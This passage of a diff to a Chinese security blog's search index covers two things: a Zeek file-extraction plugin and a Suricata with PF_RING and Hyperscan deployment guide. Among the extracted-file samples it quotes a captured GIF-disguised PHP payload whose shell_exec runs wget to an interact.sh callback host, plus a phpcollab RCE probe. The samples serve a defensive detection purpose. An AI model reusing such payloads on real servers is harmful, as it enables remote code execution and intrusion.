class="string">&quot;hash&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">hook <span class="title">FileExtraction::http_extract</span><span class="params">(f: fa_file, meta: fa_metadata)</span> &amp;priority </span>= <span class="number">5</span></span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">if</span> ( f$http?$host &amp;&amp; f$http?$method &amp;&amp; f$http?$uri &amp;&amp; f$info$is_orig )</span><br><span class="line">            <span class="keyword">if</span> ( [f$http$method] in custom_extract )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        f$info$flags = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    <strong><a href="https://github.com/Canon88/file-extraction-plus/blob/main/scripts/plugins/store-files-by-md5.zeek">store-files-by-md5.zeek</a></strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@load ../__load__</span><br><span class="line">@load policy/frameworks/files/hash-all-files</span><br><span class="line"></span><br><span class="line">event file_state_remove(f: fa_file)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">if</span> ( !f<span class="variable">$info</span>?<span class="variable">$extracted</span> || !f<span class="variable">$info</span>?<span class="variable">$md5</span> || FileExtraction::path == <span class="string">&quot;&quot;</span> )</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> orig = f$info<span class="variable">$extracted</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">local</span> split_orig = split_string(f$info<span class="variable">$extracted</span>, /\./);</span><br><span class="line">	<span class="built_in">local</span> extension = split_orig[|split_orig|-1];</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 按照日期进行文件的还原存储</span></span><br><span class="line">	<span class="built_in">local</span> ntime = fmt(<span class="string">&quot;%D&quot;</span>, network_time());</span><br><span class="line">	<span class="built_in">local</span> ndate = sub_bytes(ntime, 1, 10);</span><br><span class="line">	<span class="built_in">local</span> dest_dir = fmt(<span class="string">&quot;%s%s&quot;</span>, FileExtraction::path, ndate);</span><br><span class="line">	mkdir(dest_dir);</span><br><span class="line">	<span class="built_in">local</span> dest = fmt(<span class="string">&quot;%s/%s-%s.%s&quot;</span>, dest_dir, f<span class="variable">$source</span>, f$info<span class="variable">$md5</span>, extension);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">local</span> cmd = fmt(<span class="string">&quot;mv %s %s&quot;</span>, orig, dest);</span><br><span class="line">	when ( <span class="built_in">local</span> result = Exec::run([<span class="variable">$cmd</span>=cmd]) )</span><br><span class="line">	    &#123;</span><br><span class="line">	    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( rename(orig, dest) )</span><br><span class="line">    	f$info<span class="variable">$extracted</span> = dest;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><strong>示例 - 2</strong></p>
+<ul>
+<li>Zeek - Files</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-4.png" alt="image-20211101213845765"></p>
+<ul>
+<li>​    Zeek - HTTP</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-7.png" alt="image-20211101220829730"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-2f48899b463009a77234056c62f5c4fb.gif</span><br><span class="line">GIF89a213213123&lt;?php shell_exec(<span class="string">&quot;wget -c http://c5vi7ua23aksl756fsdgcf9186ayyyyoy.interact.sh&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>示例 - 3</strong></p>
+<ul>
+<li>Zeek - Files</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-5.png" alt="image-20211101214516921"></p>
+<ul>
+<li>Zeek - HTTP</li>
+</ul>
+<p><img src="/2021/12/31/Zeek-File-Extraction-Plus/Sample-6.png" alt="image-20211101214915506"></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ more ./zeek/2021-11-01/HTTP-c77da62fa1b8f687ea423581657dcc2c.php</span><br><span class="line">&lt;?php <span class="built_in">echo</span> md5(<span class="string">&#x27;phpcollab_rce&#x27;</span>);?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>小提示：</strong></p>
+<p>当启用文件提取时，记得调整Zeek的这个配置，指定最大提取数据大小，否则会出现提取被截段的现象。</p>
+<ul>
+<li>file-extract_limit.zeek</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">redef FileExtract::default_limit = <span class="number">5000000000</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><ul>
+<li><p><strong><a href="https://github.com/Canon88/file-extraction-plus">canon/file-extraction-plus</a></strong></p>
+</li>
+<li><p><strong><a href="https://github.com/hosom/file-extraction/actions">hosom/file-extraction</a></strong></p>
+</li>
 </ul>
 ]]></content>
       <categories>
@@ -2797,103 +2797,6 @@
       </tags>
   </entry>
   <entry>
-    <title>我在&#39;云&#39;上的日子 - Suricata(部署)</title>
-    <url>/2019/10/14/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90%20-%20Suricata%E9%83%A8%E7%BD%B2/</url>
-    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="PF-RING"><a href="#PF-RING" class="headerlink" title="PF_RING"></a>PF_RING</h2><p><strong>1. pf_ring</strong></p>
-<ul>
-<li> <strong>二进制安装</strong></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 18.04 LTS</span></span><br><span class="line">$ apt-get install software-properties-common wget</span><br><span class="line">$ add-apt-repository universe [ unless you have <span class="keyword">done</span> it previously ]</span><br><span class="line">$ wget http://apt-stable.ntop.org/18.04/all/apt-ntop-stable.deb</span><br><span class="line">$ apt install ./apt-ntop-stable.deb</span><br><span class="line"></span><br><span class="line">$ apt-get clean all</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get install pfring</span><br></pre></td></tr></table></figure>
-
-<hr>
-<ul>
-<li><strong>编译安装</strong></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ apt install git make gcc libelf-dev build-essential subversion flex libnuma-dev bison pkg-config libtool rustc cargo libjansson-dev ethtool autoconf autogen liblzma-dev libpcre3-dev libyaml-dev libpcap-dev zlib1g-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/ntop/PF_RING.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/kernel</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 pf_ring.ko</span></span><br><span class="line">$ sudo insmod pf_ring.ko min_num_slots=65536 transparent_mode=2 enable_tx_capture=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 pf_ring 信息</span></span><br><span class="line">$ cat /proc/net/pf_ring/info</span><br><span class="line">PF_RING Version          : 7.5.0 (dev:14f62e0edb2b54cd614ab9d1f6467ccb8c6c9c32)</span><br><span class="line">Total rings              : 0</span><br><span class="line"></span><br><span class="line">Standard (non ZC) Options</span><br><span class="line">Ring slots               : 65536</span><br><span class="line">Slot version             : 17</span><br><span class="line">Capture TX               : No [RX only]</span><br><span class="line">IP Defragment            : No</span><br><span class="line">Socket Mode              : Standard</span><br><span class="line">Cluster Fragment Queue   : 0</span><br><span class="line">Cluster Fragment Discard : 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载 pf_ring.ko</span></span><br><span class="line">$ sudo rmmod pf_ring</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><strong>2. libpfring、libpcap</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> PF_RING/userland/lib</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure &amp;&amp; make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ../libpcap</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure &amp;&amp; make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> PF_RING/userland/examples</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收数据包</span></span><br><span class="line">root@ubuntu:/opt/PF_RING/userland/examples# ./pfcount -i ens33</span><br><span class="line">Using PF_RING v.7.5.0</span><br><span class="line">Capturing from ens33 [mac: 00:0C:29:D5:B9:8F][if_index: 2][speed: 0Mb/s]</span><br><span class="line"><span class="meta">#</span><span class="bash"> Device RX channels: 1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Polling threads:    1</span></span><br><span class="line">Dumping statistics on /proc/net/pf_ring/stats/51441-ens33.3</span><br><span class="line">=========================</span><br><span class="line">Absolute Stats: [2 pkts total][0 pkts dropped][0.0% dropped]</span><br><span class="line">[2 pkts rcvd][424 bytes rcvd]</span><br><span class="line">=========================</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 发送数据包</span></span><br><span class="line">root@ubuntu:/opt/PF_RING/userland/examples# sudo ./pfsend -f 64byte_packets.pcap -n 0 -i ens33 -r 5</span><br><span class="line">Sending packets on ens33</span><br><span class="line">Using PF_RING v.7.5.0</span><br><span class="line">Estimated CPU freq: 2429795000 Hz</span><br><span class="line">Unable to open file 64byte_packets.pcap</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><strong>3. tcpdump</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/tcpdump/</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><strong>参考:</strong></p>
-<ul>
-<li><p><strong><a href="https://www.ntop.org/guides/pf_ring/get_started/git_installation.html">PF_RING</a></strong></p>
-</li>
-<li><p><a href="http://packages.ntop.org/apt-stable/">http://packages.ntop.org/apt-stable/</a></p>
-</li>
-<li><p><a href="https://www.ntop.org/guides/pf_ring/get_started/packages_installation.html">https://www.ntop.org/guides/pf_ring/get_started/packages_installation.html</a></p>
-</li>
-<li><p><a href="https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html">https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html</a></p>
-</li>
-</ul>
-<h2 id="LuaJIT"><a href="#LuaJIT" class="headerlink" title="LuaJIT"></a>LuaJIT</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget http://luajit.org/download/LuaJIT-2.0.5.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -zxf LuaJIT-2.0.5.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> LuaJIT-2.0.5/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig -p | grep lua</span></span><br><span class="line">	liblua5.1.so.0 (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1.so.0</span><br><span class="line">	liblua5.1.so (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1.so</span><br><span class="line">	liblua5.1-c++.so.0 (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1-c++.so.0</span><br><span class="line">	liblua5.1-c++.so (libc6,x86-64) =&gt; /usr/lib/x86_64-linux-gnu/liblua5.1-c++.so</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Hyperscan"><a href="#Hyperscan" class="headerlink" title="Hyperscan"></a>Hyperscan</h2><p><strong>1. boost</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 依赖</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> apt install cmake</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下载</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget https://dl.bintray.com/boostorg/release/1.69.0/<span class="built_in">source</span>/boost_1_69_0.tar.gz</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -xvf boost_1_69_0.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> boost_1_69_0/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./bootstrap.sh</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo ./b2 --with-iostreams --with-random install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig</span></span><br></pre></td></tr></table></figure>
-
-<p><strong>2. ragle</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ sudo apt-get install autoconf</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget http://www.colm.net/files/ragel/ragel-6.10.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ tar zxvf ragel-6.10.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> ragel-6.10</span><br><span class="line">$ ./configure</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
-
-<p><strong>3. hyperscan</strong></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ sudo apt install libpcap-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ wget https://github.com/intel/hyperscan/archive/v5.1.0.tar.gz -O hyperscan-5.1.0.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ tar -zxvf hyperscan-5.1.0.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> hyperscan-5.1.0</span><br><span class="line">$ mkdir cmake-build</span><br><span class="line">$ <span class="built_in">cd</span> cmake-build</span><br><span class="line">$ cmake -DBUILD_SHARED_LIBS=on -DCMAKE_BUILD_TYPE=Release ..</span><br><span class="line">$ make -j8</span><br><span class="line">$ sudo make install</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
-
-<p><strong>4. 验证</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ldconfig -p | grep hs</span></span><br><span class="line">	libhs_runtime.so.5 (libc6,x86-64) =&gt; /usr/local/lib/libhs_runtime.so.5</span><br><span class="line">	libhs_runtime.so (libc6,x86-64) =&gt; /usr/local/lib/libhs_runtime.so</span><br><span class="line">	libhs.so.5 (libc6,x86-64) =&gt; /usr/local/lib/libhs.so.5</span><br><span class="line">	libhs.so (libc6,x86-64) =&gt; /usr/local/lib/libhs.so</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p><strong>参考:</strong></p>
-<ul>
-<li><a href="http://www.manongjc.com/article/110977.html"><strong>Hyperscan - 5.1.0 安装</strong></a></li>
-</ul>
-<h2 id="Suricata"><a href="#Suricata" class="headerlink" title="Suricata"></a><strong>Suricata</strong></h2><h3 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> apt-get install libpcre3 libpcre3-dbg libpcre3-dev build-essential libpcap-dev   \</span></span><br><span class="line"><span class="bash">                libnet1-dev libyaml-0-2 libyaml-dev pkg-config zlib1g zlib1g-dev \</span></span><br><span class="line"><span class="bash">                libcap-ng-dev libcap-ng0 make libmagic-dev libjansson-dev        \</span></span><br><span class="line"><span class="bash">                libnss3-dev libgeoip-dev libhiredis-dev libevent-dev \</span></span><br><span class="line"><span class="bash">                python-yaml rustc cargo libmaxminddb-dev liblzma-dev \</span></span><br><span class="line"><span class="bash">                python3-distutils liblz4-dev</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="安装方式-2选1"><a href="#安装方式-2选1" class="headerlink" title="安装方式: 2选1"></a>安装方式: 2选1</h3><h4 id="release"><a href="#release" class="headerlink" title="release"></a>release</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ wget https://www.openinfosecfoundation.org/download/suricata-5.0.2.tar.gz</span><br><span class="line">$ tar zxvf suricata-5.0.2.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> suricata</span><br><span class="line">$ ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-pfring --with-libpfring-includes=/usr/<span class="built_in">local</span>/include --with-libpfring-libraries=/usr/<span class="built_in">local</span>/lib --enable-geoip  --enable-luajit --with-libluajit-includes=/usr/<span class="built_in">local</span>/include/luajit-2.0/ --with-libluajit-libraries=/usr/<span class="built_in">local</span>/lib/ --with-libhs-includes=/usr/<span class="built_in">local</span>/include/hs/ --with-libhs-libraries=/usr/<span class="built_in">local</span>/lib/</span><br><span class="line">$ make &amp;&amp; make install-full</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
-
-<h4 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ mkdir suricata</span><br><span class="line">$ <span class="built_in">cd</span> suricata</span><br><span class="line">$ git <span class="built_in">clone</span> git://phalanx.openinfosecfoundation.org/oisf.git</span><br><span class="line">$ <span class="built_in">cd</span> oisf</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/OISF/libhtp.git</span><br><span class="line">$ ./autogen.sh</span><br><span class="line">$ ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-pfring --with-libpfring-includes=/usr/<span class="built_in">local</span>/include --with-libpfring-libraries=/usr/<span class="built_in">local</span>/lib --enable-geoip  --enable-luajit --with-libluajit-includes=/usr/<span class="built_in">local</span>/include/luajit-2.0/ --with-libluajit-libraries=/usr/<span class="built_in">local</span>/lib/ --with-libhs-includes=/usr/<span class="built_in">local</span>/include/hs/ --with-libhs-libraries=/usr/<span class="built_in">local</span>/lib/</span><br><span class="line">$ make &amp;&amp; make install-full</span><br><span class="line">$ ldconfig</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p><strong>1. PF_RING</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep PF_RING</span></span><br><span class="line">Features: PCAP_SET_BUFF PF_RING AF_PACKET HAVE_PACKET_FANOUT LIBCAP_NG LIBNET1.1 HAVE_HTP_URI_NORMALIZE_HOOK PCRE_JIT HAVE_NSS HAVE_LUA HAVE_LUAJIT HAVE_LIBJANSSON PROFILING TLS MAGIC RUST</span><br><span class="line">  PF_RING support:                         yes</span><br></pre></td></tr></table></figure>
-
-<p><strong>2. LuaJit</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep lua</span></span><br><span class="line">  LUA support:                             yes, through luajit</span><br><span class="line">  libluajit:                               yes</span><br></pre></td></tr></table></figure>
-
-<p><strong>3. Hyperscan</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --build-info | grep Hyperscan</span></span><br><span class="line">  Hyperscan support:                       yes</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> suricata --pfring-int=ens6 --pfring-cluster-id=99 --pfring-cluster-type=cluster_flow -c /etc/suricata/suricata.yaml</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="规则管理"><a href="#规则管理" class="headerlink" title="规则管理"></a>规则管理</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ pip install --upgrade suricata-update</span><br></pre></td></tr></table></figure>
-
-<p><strong>定时更新</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> crontab -l</span></span><br><span class="line">10 0 * * * /usr/bin/suricata-update --no-test &amp;&amp; /usr/bin/suricatasc -c reload-rules</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p><a href="https://www.jianshu.com/p/9348e211a6a2">https://www.jianshu.com/p/9348e211a6a2</a></p>
-]]></content>
-      <categories>
-        <category>NIDS</category>
-      </categories>
-      <tags>
-        <tag>Suricata</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>致我心中的“散装”SOAR，当Thehive遇到n8n</title>
     <url>/2023/01/01/%E5%BD%93TheHive%E9%81%87%E5%88%B0n8n/</url>
     <content><![CDATA[<h4 id="写在最前面"><a href="#写在最前面" class="headerlink" title="写在最前面"></a>写在最前面</h4><p>​    2022这一年有太多琐碎的事，导致这个“作业”从2022年“成功”被我拖到了2023年。如果你和我一样，尝试用开源组件来构建一套安全运营平台，并且恰巧你也正在使用Thehive来管理日常安全运营工作，同时在寻求提升运营效率的途径。那么，我觉得这篇文章应该会对你有所帮助。</p>
@@ -3118,6 +3021,103 @@
       </categories>
       <tags>
         <tag>Zeek</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>我在&#39;云&#39;上的日子 - Suricata(部署)</title>
+    <url>/2019/10/14/%E6%88%91%E5%9C%A8%E4%BA%91%E4%B8%8A%E7%9A%84%E6%97%A5%E5%AD%90%20-%20Suricata%E9%83%A8%E7%BD%B2/</url>
+    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="PF-RING"><a href="#PF-RING" class="headerlink" title="PF_RING"></a>PF_RING</h2><p><strong>1. pf_ring</strong></p>
+<ul>
+<li> <strong>二进制安装</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 18.04 LTS</span></span><br><span class="line">$ apt-get install software-properties-common wget</span><br><span class="line">$ add-apt-repository universe [ unless you have <span class="keyword">done</span> it previously ]</span><br><span class="line">$ wget http://apt-stable.ntop.org/18.04/all/apt-ntop-stable.deb</span><br><span class="line">$ apt install ./apt-ntop-stable.deb</span><br><span class="line"></span><br><span class="line">$ apt-get clean all</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get install pfring</span><br></pre></td></tr></table></figure>
+
+<hr>
+<ul>
+<li><strong>编译安装</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依赖</span></span><br><span class="line">$ apt install git make gcc libelf-dev build-essential subversion flex libnuma-dev bison pkg-config libtool rustc cargo libjansson-dev ethtool autoconf autogen liblzma-dev libpcre3-dev libyaml-dev libpcap-dev zlib1g-dev</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/ntop/PF_RING.git</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/kernel</span><br><span class="line">$ make</span><br><span class="line">$ sudo make install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载 pf_ring.ko</span></span><br><span class="line">$ sudo insmod pf_ring.ko min_num_slots=65536 transparent_mode=2 enable_tx_capture=0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看 pf_ring 信息</span></span><br><span class="line">$ cat /proc/net/pf_ring/info</span><br><span class="line">PF_RING Version          : 7.5.0 (dev:14f62e0edb2b54cd614ab9d1f6467ccb8c6c9c32)</span><br><span class="line">Total rings              : 0</span><br><span class="line"></span><br><span class="line">Standard (non ZC) Options</span><br><span class="line">Ring slots               : 65536</span><br><span class="line">Slot version             : 17</span><br><span class="line">Capture TX               : No [RX only]</span><br><span class="line">IP Defragment            : No</span><br><span class="line">Socket Mode              : Standard</span><br><span class="line">Cluster Fragment Queue   : 0</span><br><span class="line">Cluster Fragment Discard : 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载 pf_ring.ko</span></span><br><span class="line">$ sudo rmmod pf_ring</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>2. libpfring、libpcap</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> PF_RING/userland/lib</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure &amp;&amp; make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> ../libpcap</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ./configure &amp;&amp; make</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> PF_RING/userland/examples</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 接收数据包</span></span><br><span class="line">root@ubuntu:/opt/PF_RING/userland/examples# ./pfcount -i ens33</span><br><span class="line">Using PF_RING v.7.5.0</span><br><span class="line">Capturing from ens33 [mac: 00:0C:29:D5:B9:8F][if_index: 2][speed: 0Mb/s]</span><br><span class="line"><span class="meta">#</span><span class="bash"> Device RX channels: 1</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Polling threads:    1</span></span><br><span class="line">Dumping statistics on /proc/net/pf_ring/stats/51441-ens33.3</span><br><span class="line">=========================</span><br><span class="line">Absolute Stats: [2 pkts total][0 pkts dropped][0.0% dropped]</span><br><span class="line">[2 pkts rcvd][424 bytes rcvd]</span><br><span class="line">=========================</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 发送数据包</span></span><br><span class="line">root@ubuntu:/opt/PF_RING/userland/examples# sudo ./pfsend -f 64byte_packets.pcap -n 0 -i ens33 -r 5</span><br><span class="line">Sending packets on ens33</span><br><span class="line">Using PF_RING v.7.5.0</span><br><span class="line">Estimated CPU freq: 2429795000 Hz</span><br><span class="line">Unable to open file 64byte_packets.pcap</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>3. tcpdump</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装</span></span><br><span class="line">$ <span class="built_in">cd</span> PF_RING/userland/tcpdump/</span><br><span class="line">$ ./configure &amp;&amp; make</span><br><span class="line">$ sudo make install</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>参考:</strong></p>
+<ul>
+<li><p><strong><a href="https://www.ntop.org/guides/pf_ring/get_started/git_installation.html">PF_RING</a></strong></p>
+</li>
+<li><p><a href="http://packages.ntop.org/apt-stable/">http://packages.ntop.org/apt-stable/</a></p>
+</li>
+<li><p><a href="https://www.ntop.org/guides/pf_ring/get_started/packages_installation.html">https://www.ntop.org/guides/pf_ring/get_started/packages_installation.html</a></p>
+</li>
+<li><p><a href="https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html">https://www.ntop.org/guides/pf_ring/thirdparty/suricata.html</a></p>
+</li>
+</ul>
+<h2 id="LuaJIT"><a href="#LuaJIT" class="headerlink" title="LuaJIT"></a>LuaJIT</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 安装</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> wget http://luajit.org/download/LuaJIT-2.0.5.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar -zxf LuaJIT-2.0.5.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> LuaJIT-2.0.5/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ldconfig -p | grep lua</span></span><br><span class="line">	liblua5.1.so.0 (libc6,x86-64) =&gt; 